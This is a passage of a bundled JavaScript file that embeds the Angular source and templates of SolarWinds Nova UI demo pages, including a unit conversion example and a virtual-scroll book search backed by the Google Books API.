strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiMessageModule,\n    NuiTextboxModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { UnitConversionServiceDocsComponent } from "./docs/unit-conversion-service-docs.component";\nimport { UnitConversionServiceBasicExampleComponent } from "./unit-conversion-service-basic/unit-conversion-service-basic.example.component";\nimport { UnitConversionServiceSeparateUnitDisplayExampleComponent } from "./unit-conversion-service-separate-unit-display/unit-conversion-service-separate-unit-display.example.component";\n\nconst routes = [\n    {\n        path: "",\n        component: UnitConversionServiceDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "basic",\n        component: UnitConversionServiceBasicExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "separate-unit-display",\n        component: UnitConversionServiceSeparateUnitDisplayExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n];\n\n@NgModule({\n    declarations: [\n        UnitConversionServiceDocsComponent,\n        UnitConversionServiceBasicExampleComponent,\n        UnitConversionServiceSeparateUnitDisplayExampleComponent,\n    ],\n    imports: [\n        FormsModule,\n        NuiDocsModule,\n        NuiFormFieldModule,\n        NuiMessageModule,\n        NuiTextboxModule,\n        RouterModule.forChild(routes),\n    ],\n    exports: [RouterModule],\n})\nexport class UnitConversionServiceExampleModule {}\n'},27172:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex">\n    <div\n        class="conversion d-flex flex-column align-items-center justify-content-center"\n    >\n        <div class="conversion__value">{{ valueDisplay }}</div>\n        \x3c!-- ngIf to hide the unit if the conversion result is determined to be NaN --\x3e\n        <div *ngIf="unitDisplay" class="conversion__unit">\n            {{ unitDisplay }}\n        </div>\n    </div>\n</div>\n<hr />\n<nui-form-field\n    class="d-block mt-5"\n    caption="Hertz"\n    i18n-caption\n    [showOptionalText]="false"\n>\n    <nui-textbox-number\n        type="number"\n        [ngModel]="num"\n        (ngModelChange)="onNumberChange($event)"\n        [minValue]="0"\n        [step]="10"\n        customBoxWidth="200px"\n    ></nui-textbox-number>\n</nui-form-field>\n'},87076:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".conversion {\n    width: 110px;\n    height: 70px;\n\n    &__value {\n        font-size: 25px;\n    }\n\n    &__unit {\n        font-size: 15px;\n    }\n}\n"},38276:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\n\nimport {\n    IUnitConversionResult,\n    UnitBase,\n    UnitConversionService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "unit-conversion-service-separate-unit-display-example",\n    templateUrl:\n        "./unit-conversion-service-separate-unit-display.example.component.html",\n    styleUrls: [\n        "./unit-conversion-service-separate-unit-display.example.component.less",\n    ],\n})\nexport class UnitConversionServiceSeparateUnitDisplayExampleComponent\n    implements OnInit\n{\n    constructor(public unitConversionService: UnitConversionService) {}\n\n    public num: number;\n    public valueDisplay: string;\n    public unitDisplay: string;\n\n    public ngOnInit(): void {\n        this.onNumberChange(1000);\n    }\n\n    public onNumberChange(num: number): void {\n        this.num = num;\n        const conversion: IUnitConversionResult =\n            this.unitConversionService.convert(this.num, UnitBase.Standard, 2);\n        this.unitDisplay = this.unitConversionService.getUnitDisplay(\n            conversion,\n            "hertz"\n        );\n\n        if (this.unitDisplay) {\n            this.valueDisplay =\n                this.unitConversionService.getValueDisplay(conversion);\n        } else {\n            // An undefined getUnitDisplay return value indicates the input value was too large to be converted,\n            // so the base unit and scientific notation can be used as fallbacks.\n            this.unitDisplay =\n                this.unitConversionService.getUnitDisplayBaseValue("hertz");\n            this.valueDisplay =\n                this.unitConversionService.getScientificDisplay(conversion);\n        }\n    }\n}\n'},63965:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="mb-2">\n    <nui-search\n        placeholder="Search book by title"\n        i18n-placeholder\n        [value]="\'\'"\n        (search)="onSearch()"\n        (cancel)="onCancelSearch()"\n    >\n    </nui-search>\n</div>\n\n<ng-container *ngIf="!busy && (books$ | async).length === 0">\n    No results\n</ng-container>\n\n\x3c!-- Note that the height is defined in order to accommodate virtual scrolling --\x3e\n<nui-repeat\n    [itemsSource]="books$ | async"\n    [repeatItemTemplateRef]="userItemTemplate"\n    [virtualScroll]="true"\n    style="height: 300px"\n    [itemSize]="30"\n>\n</nui-repeat>\n\n\x3c!--This progress bar is for demo purposes only. Please consult with your UX designer to determine an appropriate layout for your implementation.--\x3e\n<nui-progress [show]="busy" compactMode="true"></nui-progress>\n\n<ng-template #userItemTemplate let-book="item">\n    <div>\n        <span class="nui-text-secondary">{{ book.title }}</span>\n    </div>\n</ng-template>\n'},20329:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { HttpClient, HttpParams } from "@angular/common/http";\nimport {\n    AfterViewInit,\n    ChangeDetectorRef,\n    Component,\n    Injectable,\n    OnDestroy,\n    OnInit,\n    ViewChild,\n} from "@angular/core";\nimport isEqual from "lodash/isEqual";\nimport isNil from "lodash/isNil";\nimport { BehaviorSubject, firstValueFrom, Observable, of, Subject } from "rxjs";\nimport {\n    catchError,\n    delay,\n    finalize,\n    // eslint-disable-next-line import/no-deprecated\n    map,\n    // eslint-disable-next-line import/no-deprecated\n    switchMap,\n    takeUntil,\n    // eslint-disable-next-line import/no-deprecated\n    tap,\n} from "rxjs/operators";\n\nimport {\n    DataSourceService,\n    IDataSource,\n    IDataSourceOutput,\n    IFilter,\n    IFilteringOutputs,\n    IFilters,\n    INovaFilteringOutputs,\n    INovaFilters,\n    LoggerService,\n    RepeatComponent,\n    SearchComponent,\n    VirtualViewportManager,\n} from "@nova-ui/bits";\n\nconst API_URL = "https://www.googleapis.com/books/v1/volumes";\nconst RESULTS_PER_PAGE = 20;\n\n// collection of books that we\'ve received from the Google Books backend API response\ninterface IGBooksApiResponse {\n    kind: string;\n    totalItems: number;\n    items: IGBookBackendDTO[];\n    [key: string]: any;\n}\n\n// main book model being received from the backend\ninterface IGBookBackendDTO {\n    id: string;\n    volumeInfo: {\n        title: string;\n        subtitle: string;\n        authors: string[];\n        [key: string]: any;\n    };\n    accessInfo: { [key: string]: any };\n    saleInfo: { [key: string]: any };\n}\n\n// collection of books that we\'ve transformed from the backend API\ninterface IGBooksFrontendCollection {\n    books: IGBookFrontendDTO[];\n    totalItems: number;\n}\n\n// main model being processed & rendered in the frontend\n// PS: these are only the fields we decided we want to process\n// since there are many other model proprieties in the backend DTO\ninterface IGBookFrontendDTO {\n    title: string;\n    authors: string;\n}\n\n/**\n * Example of a Remote DataSourceService which is using the API from Google Books API\n * to fetch data\n */\n@Injectable()\nexport class GBooksDataSourceWithSearch\n    extends DataSourceService<IGBookFrontendDTO>\n    implements IDataSource\n{\n    public busy = new BehaviorSubject(false);\n\n    // cache used to store our previous fetched results while scrolling\n    // and more data is automatically fetched from the backend\n    private cache = Array.from<IGBookFrontendDTO>({ length: 0 });\n    private previousFilters: INovaFilters;\n\n    private applyFilters$ = new Subject<IFilters>();\n\n    constructor(private logger: LoggerService, private http: HttpClient) {\n        super();\n\n        this.applyFilters$\n            .pipe(\n                // cancel any previous requests\n                // eslint-disable-next-line import/no-deprecated\n                switchMap((filters) => this.getData(filters))\n            )\n            .subscribe(async (res) => {\n                this.outputsSubject.next(await this.getFilteredData(res));\n            });\n    }\n\n    public async getFilteredData(\n        booksData: IGBooksFrontendCollection\n    ): Promise<IDataSourceOutput<INovaFilteringOutputs>> {\n        return firstValueFrom(\n            of(booksData).pipe(\n                // eslint-disable-next-line import/no-deprecated\n                tap((response: IGBooksFrontendCollection) => {\n                    // after receiving data we need to append it to our previous fetched results\n                    this.cache = this.cache.concat(response.books);\n                }),\n                // eslint-disable-next-line import/no-deprecated\n                map((response: IGBooksFrontendCollection) => ({\n                    result: {\n                        repeat: { itemsSource: this.cache },\n                        paginator: { total: response.totalItems },\n                    },\n                }))\n            )\n        );\n    }\n\n    // redefine parent method\n    public async applyFilters(): Promise<void> {\n        this.applyFilters$.next(this.getFilters());\n    }\n\n    private getData(\n        filters: INovaFilters\n    ): Observable<IGBooksFrontendCollection> {\n        // Note: Every new search request should clear the\n        // cache in order to correctly display a new set of data.\n        if (this.isNewSearchTerm(filters.search)) {\n            this.cache = [];\n        }\n\n        // fetch response from the backend\n        return this.http\n            .get<IGBooksApiResponse>(API_URL, {\n                params: this.getRequestParams(filters),\n            })\n            .pipe(\n                // show the loader\n                // eslint-disable-next-line import/no-deprecated\n                tap(() => this.busy.next(true)),\n\n                // since API being used (Google Books ) sends the response almost immediately,\n                // we need to fake it takes longer to be able the show the spinner component\n                // while the data is being received\n                // PS: NOT to be used in real examples\n                delay(300),\n\n                // transform backend API response (IGBooksApiResponse)\n                // to our frontend books collection (IGBooksFrontendCollection)\n                // eslint-disable-next-line import/no-deprecated\n                map((response) => ({\n                    books:\n                        response.items?.map((volume) => ({\n                            title: volume.volumeInfo.title,\n                            authors:\n                                volume.volumeInfo.authors?.join(", ") || "",\n                        })) || [],\n                    totalItems: response.totalItems,\n                })),\n\n                // error handle in case of any error\n                catchError((e) => {\n                    this.logger.error(e);\n                    return of({\n                        books: [],\n                        totalItems: 0,\n                    });\n                }),\n\n                finalize(() => {\n                    // no matter if the backend response was successful or not,\n                    // we need to hide our loader and reset the filters\n                    this.busy.next(false);\n                    this.previousFilters = filters;\n                })\n            );\n    }\n\n    // build query params specific to our backend API\n    private getRequestParams(filters: INovaFilters): HttpParams {\n        return (\n            new HttpParams()\n                // define the start page used by the virtual scroll internal "paginator"\n                .set(\n                    "startIndex",\n                    filters.virtualScroll?.value?.start.toString() ?? ""\n                )\n\n                // specify the maximum number of items we need to fetch for each request\n                .set("maxResults", String(RESULTS_PER_PAGE))\n\n                // google books api requires some criteria to do the search\n                .set(\n                    "q",\n                    filters.search ? `intitle:${filters.search.value}` : "_" // google books api requires some criteria to do the search\n                )\n        );\n    }\n\n    private isNewSearchTerm(search: IFilter<string> | undefined) {\n        return (\n            !isNil(search?.value) &&\n            !isEqual(search?.value, this.previousFilters?.search?.value)\n        );\n    }\n}\n\n@Component({\n    selector: "nui-repeat-with-viewport-manager-example",\n    templateUrl: "./repeat-with-viewport-manager.example.component.html",\n    providers: [VirtualViewportManager, GBooksDataSourceWithSearch],\n})\nexport class RepeatWithViewportManagerExampleComponent\n    implements OnInit, OnDestroy, AfterViewInit\n{\n    public books$ = new BehaviorSubject<IGBookBackendDTO[]>([]);\n    public busy: boolean = false;\n\n    @ViewChild(RepeatComponent) private repeat: RepeatComponent;\n    @ViewChild(SearchComponent) private search: SearchComponent;\n\n    private readonly destroy$ = new Subject<void>();\n\n    constructor(\n        private viewportManager: VirtualViewportManager,\n        private cd: ChangeDetectorRef,\n        private dataSource: GBooksDataSourceWithSearch\n    ) {}\n\n    public ngOnInit(): void {\n        this.dataSource.busy\n            .pipe(\n                // eslint-disable-next-line import/no-deprecated\n                tap((val) => {\n                    this.busy = val;\n                    this.cd.detectChanges();\n                }),\n                takeUntil(this.destroy$)\n            )\n            .subscribe();\n    }\n\n    public ngAfterViewInit(): void {\n        // Note: registering filtering participants\n        this.registerFilters();\n\n        this.viewportManager\n            // Note: Initializing viewportManager with the repeat\'s CDK Viewport Ref\n            .setViewport(this.repeat.viewportRef)\n            // Note: Initializing the stream with the desired page size, based on which\n            // ViewportManager will perform the observations and will emit\n            // distinct ranges with step equal to provided pageSize\n            .observeNextPage$({ pageSize: RESULTS_PER_PAGE })\n            .pipe(\n                // eslint-disable-next-line import/no-deprecated\n                tap(() => {\n                    this.dataSource.applyFilters();\n                }),\n                // Note: Using the same stream to subscribe to the outputsSubject and update the items list\n                // eslint-disable-next-line import/no-deprecated\n                switchMap(() =>\n                    this.dataSource.outputsSubject.pipe(\n                        // eslint-disable-next-line import/no-deprecated\n                        tap((outputs: IFilteringOutputs) => {\n                            this.books$.next(\n                                outputs.result.repeat.itemsSource || []\n                            );\n                            this.cd.detectChanges();\n                        })\n                    )\n                ),\n                takeUntil(this.destroy$)\n            )\n            .subscribe();\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n\n    public onSearch(): void {\n        this.doSearch();\n    }\n\n    public onCancelSearch(): void {\n        this.doSearch();\n    }\n\n    private doSearch() {\n        // Note: It is important to reset viewportManager to start page\n        // so that the datasource performs the search with 1st page\n        // emitFirstPage: false prevents viewportManager emitting first page after reset\n        this.viewportManager.reset({ emitFirstPage: false });\n        this.dataSource.applyFilters();\n    }\n\n    private registerFilters() {\n        this.dataSource.registerComponent({\n            virtualScroll: { componentInstance: this.viewportManager },\n            search: { componentInstance: this.search },\n        });\n    }\n}\n'},21353:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>VirtualViewportManager</code> provides a mechanism for sequencing the\n    rendered range stream emitted from the <code>CDK Viewport</code> into\n    distinct page ranges.\n</p>\n<h2>Basic Usage</h2>\n<p>To use <code>VirtualViewportManager</code> do the following:</p>\n<ol>\n    <li>\n        Add <code>VirtualViewportManager</code> to the providers of your parent\n        component.\n    </li>\n    <li>\n        Register the filtering components on the dataSource via\n        <code>this.dataSource.registerFilter()</code>.\n    </li>\n    <li>\n        Set up the <code>VirtualViewportManager</code> listener in the\n        <code>AfterViewInit</code> lifecycle hook. Invoke\n        viewport.observeNextPage$() with\n        <a href="../interfaces/IVirtualPageConfig.html" target="_blank"\n            >IVirtualPageConfig</a\n        >\n        to start observing/responding to next page events.\n    </li>\n    <li>\n        Reset the viewport on search events by invoking viewport.reset() with\n        <a\n            href="../interfaces/IVirtualViewportResetOptions.html"\n            target="_blank"\n            >IVirtualViewportResetOptions</a\n        >.\n    </li>\n</ol>\n\n<h2>Repeat with VirtualViewportManager and Search Example</h2>\n<p>\n    <code>nui-repeat</code> allows you to manage the virtual viewport by\n    exposing its <code>{{ getRepeatPropKey("viewportRef") }}</code> property. In\n    comparison to the non-filtered virtual/infinite scroll usage, if the user\n    filters the results in some way, say with a search box, we need to reset\n    progress on our <code>VirtualViewportManager</code>. In the following\n    example, when the data is refreshed with the filtered results, the viewport\n    manager\'s progress is reset in the <code>doSearch</code> method. <br />\n    <nui-message [allowDismiss]="false" type="warning">\n        <strong>Important: </strong> For virtual scroll to function correctly,\n        the nui-repeat element must have a defined height. See the template file\n        in the example source expander below for how to do this.\n    </nui-message>\n</p>\n<nui-example-wrapper\n    filenamePrefix="repeat-with-viewport-manager"\n    exampleTitle="Repeat with ViewportManager and Search"\n>\n    <nui-repeat-with-viewport-manager-example></nui-repeat-with-viewport-manager-example>\n</nui-example-wrapper>\n'},98021:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { RepeatComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-virtual-viewport-manager-docs",\n    templateUrl: "./virtual-viewport-manager-docs.component.html",\n})\nexport class VirtualViewportManagerDocsComponent {\n    getRepeatPropKey(key: keyof RepeatComponent): string {\n        return key;\n    }\n}\n'},38956:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="<div>Welcome to Nui Demo Page!</div>\n"},20860:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-demo-welcome-page",\n    templateUrl: "./welcome-page.component.html",\n})\nexport class WelcomePageComponent {}\n'},3656:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h3>Small Size</h3>\n<nui-content id="test-element-small" size="small">\n    <div>\n        <button\n            nui-button\n            type="button"\n            id="test-element"\n            (click)="changeButtonText($event)"\n        >\n            Click\n        </button>\n        {{ dynamicContent }}\n    </div>\n</nui-content>\n<h3>Default Size</h3>\n<nui-content id="test-element-normal">{{ dynamicContent }}</nui-content>\n<h3>Large Size</h3>\n<nui-content id="test-element-large" size="large">{{\n    dynamicContent\n}}</nui-content>\n'},9368:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    templateUrl: "./content.example.component.html",\n})\nexport class ContentExampleComponent {\n    public dynamicContent = `\n        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras at viverra orci.\n        Sed elementum lacus eget finibus varius. Fusce rhoncus libero augue.\n        Cras cursus purus convallis ex laoreet, a pulvinar neque mollis.\n        Maecenas fermentum, turpis non aliquam suscipit, sapien ligula feugiat lorem, a suscipit nulla\n        Sed mollis iaculis varius. Suspendisse auctor finibus diam, eget laoreet tellus fermentum nec.\n        Fusce iaculis varius lorem at lacinia. Curabitur et cursus eros, at congue lorem.\n        Aenean urna ipsum, sollicitudin sed ultrices nec, malesuada eu lacus.\n        Sed orci mauris, scelerisque vitae consectetur sit amet, venenatis a mauris.\n        Donc consectetur libero eget bibendum consequat. Donec tincidunt molestie viverra.\n        Nunc vel congue orci.Nullam suscipit dui sit amet justo consectetur hendrerit.\n        Nullam condimentum accumsan commodo. Donec vehicula lorem dui, ac consectetur dolor mollis at.\n        Vivamus et magna nec nulla maximus imperdiet et non quam. Quisque iaculis faucibus mi, et\n        Praesent sit amet lacus vel nulla suscipit eleifend. Pellentesque habitant morbi tristique.\n        Proin odio erat, mattis in ultrices sit amet, pharetra accumsan purus.\n        In sit amet dui sed sem cursus varius. Fusce sed tortor rutrum, sagittis nulla ut, maximus urna.\n        Integer pharetra nisi odio.Nulla mollis molestie mi a tincidunt. Donec egestas nibh id feugiat.\n        Integer imperdiet eu justo suscipit eleifend. Praesent egestas mi ac magna congue, ut consectetur\n        Morbi placerat nisi dolor, eu accumsan justo elementum ut. Suspendisse semper laoreet magna quis.\n        Nullam convallis egestas auctor. Nulla elementum enim convallis, egestas justo in, pulvinar.\n        Morbi nec feugiat mauris. In hac habitasse platea dictumst. Phasellus laoreet hendrerit mauris.\n        Cras vitae luctus magna, a sagittis magna. Aliquam sagittis sodales nibh vel posuere.\n        Maecenas pellentesque tristique aliquet.Sed ultrices erat arcu, molestie faucibus lectus et.\n        Aenean porta risus at libero venenatis vestibulum. Nullam laoreet nisl nec elit laoreet sodales.\n        Curabitur vehicula laoreet sapien a condimentum. Proin pharetra augue vel hendrerit mattis.\n        Aenean eu dolor sed erat molestie finibus quis vel ex. Praesent auctor consequat ultricies.\n        Morbi dolor eros, finibus et felis a, semper bibendum orci. Pellentesque accumsan ante finibus.\n        Suspendisse ac mi eu est eleifend iaculis. Aliquam purus diam, viverra scelerisque lectus ut.\n        Sed rhoncus et dui vitae rhoncus. Aliquam volutpat eu turpis at consectetur.Cum sociis natoque\n        Ut vitae ultricies diam. Fusce ultrices faucibus neque ut malesuada. Morbi malesuada facilisis.\n        Sed ultricies eu diam quis imperdiet. Maecenas tincidunt luctus nisl condimentum mollis.\n    `;\n\n    changeButtonText(event: any): void {\n        event.target.textContent = "Clicked!";\n    }\n}\n'},91611:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiContentModule,\n    NuiDocsModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { ContentExampleComponent } from "./content.example.component";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ContentExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.alpha,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiContentModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [ContentExampleComponent],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("content"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ContentModule {}\n'},28035:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule, Type } from "@angular/core";\nimport { RouterModule, Routes } from "@angular/router";\n\nimport { DEMO_PATH_TOKEN, SrlcStage } from "@nova-ui/bits";\n\nimport { SummaryComponent } from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes: Routes = [\n    {\n        path: "",\n        redirectTo: "summary",\n        